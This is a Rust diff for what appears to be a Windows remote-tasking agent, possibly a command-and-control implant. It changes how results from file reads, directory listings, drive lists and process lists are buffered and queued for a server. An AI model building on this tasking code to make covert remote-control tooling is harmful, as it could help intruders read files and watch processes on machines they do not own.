@@ -233,7 +233,19 @@ unsafe fn cat(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer)
         error(kernel32, id, results);
         return;
     }
-    let _ = transport::push_cat_result(results, id, task.path(), &buf[..got as usize]);
+    // Whole-record copy (see ls): the record lands entirely or degrades
+    // to the small error ack.
+    let mut scratch = [0u8; CAT_CAP + 320];
+    let mut cw = Writer::new(&mut scratch);
+    if !transport::push_cat_result(&mut cw, id, task.path(), &buf[..got as usize]) {
+        return;
+    }
+    let record = cw.written_bytes();
+    if results.remaining() < record.len() {
+        error(kernel32, id, results);
+        return;
+    }
+    let _ = results.push(record);
 }
 
 unsafe fn ls(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
@@ -287,7 +299,7 @@ unsafe fn ls(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) 
     }
 
     // Entries land in a scratch writer first: the count precedes them.
-    let mut scratch = [0u8; 2048];
+    let mut scratch = [0u8; 8192];
     let mut sw = Writer::new(&mut scratch);
     let mut count: u32 = 0;
     loop {
@@ -338,18 +350,23 @@ unsafe fn ls(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) 
     }
     let root = &task.path()[..root_end];
 
-    if !transport::push_ls_result_header(results, id, root, count) {
+    // Whole-record copy: the header and the entries land in the cycle
+    // queue entirely or not at all — a truncated listing (count vs
+    // entries) would fail the server's packer and lose every result of
+    // the cycle. An oversized record degrades to the small error ack.
+    let mut header = [0u8; 320];
+    let mut hw = Writer::new(&mut header);
+    if !transport::push_ls_result_header(&mut hw, id, root, count) {
         return;
     }
-    // Manual copy of the scratch (memcpy rule).
-    let mut i = 0;
-    let bytes = sw.written_bytes();
-    while i < bytes.len() {
-        if !results.push(&[bytes[i]]) {
-            return;
-        }
-        i += 1;
+    let hdr = hw.written_bytes();
+    let entries = sw.written_bytes();
+    if results.remaining() < hdr.len() + entries.len() {
+        error(kernel32, id, results);
+        return;
     }
+    let _ = results.push(hdr);
+    let _ = results.push(entries);
 }
 
 unsafe fn mkdir(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
@@ -615,7 +632,10 @@ unsafe fn disks(kernel32: *mut c_void, id: u32, results: &mut Writer) {
         }
         i += 1;
     }
-    if !transport::push_disks_header(results, id, count as u32) {
+    // Whole-record copy (see ls): header + entries, all or nothing.
+    let mut scratch = [0u8; 192];
+    let mut hw = Writer::new(&mut scratch);
+    if !transport::push_disks_header(&mut hw, id, count as u32) {
         return;
     }
     let mut e = 0usize;
@@ -626,11 +646,17 @@ unsafe fn disks(kernel32: *mut c_void, id: u32, results: &mut Writer) {
         path[1] = b':';
         path[2] = b'\\';
         let drive_type = dtype(path.as_ptr());
-        if !transport::push_disks_entry(results, letter, drive_type) {
+        if !transport::push_disks_entry(&mut hw, letter, drive_type) {
             return;
         }
         e += 1;
     }
+    let record = hw.written_bytes();
+    if results.remaining() < record.len() {
+        error(kernel32, id, results);
+        return;
+    }
+    let _ = results.push(record);
 }
 
 /// PROCESSENTRY32W offsets (x64): dwSize +0, pid +8, ppid +0x20,
@@ -683,7 +709,7 @@ unsafe fn ps_list(kernel32: *mut c_void, id: u32, results: &mut Writer) {
     entry[1] = (PE32W_SIZE >> 8) as u8;
 
     // Entries land in a scratch writer first: the count precedes them.
-    let mut scratch = [0u8; 4096];
+    let mut scratch = [0u8; 12288];
     let mut sw = Writer::new(&mut scratch);
     let mut count: u32 = 0;
     let mut ok = first(handle, entry.as_mut_ptr()) != 0;
@@ -759,17 +785,20 @@ unsafe fn ps_list(kernel32: *mut c_void, id: u32, results: &mut Writer) {
         error(kernel32, id, results);
         return;
     }
-    if !transport::push_ps_list_header(results, id, count) {
+    // Whole-record copy (see ls): header + entries, all or nothing.
+    let mut header = [0u8; 32];
+    let mut hw = Writer::new(&mut header);
+    if !transport::push_ps_list_header(&mut hw, id, count) {
         return;
     }
-    let bytes = sw.written_bytes();
-    let mut i = 0;
-    while i < bytes.len() {
-        if !results.push(&[bytes[i]]) {
-            return;
-        }
-        i += 1;
+    let hdr = hw.written_bytes();
+    let entries = sw.written_bytes();
+    if results.remaining() < hdr.len() + entries.len() {
+        error(kernel32, id, results);
+        return;
     }
+    let _ = results.push(hdr);
+    let _ = results.push(entries);
 }
 
 unsafe fn ps_kill(kernel32: *mut c_void, pid: u32, id: u32, results: &mut Writer) {
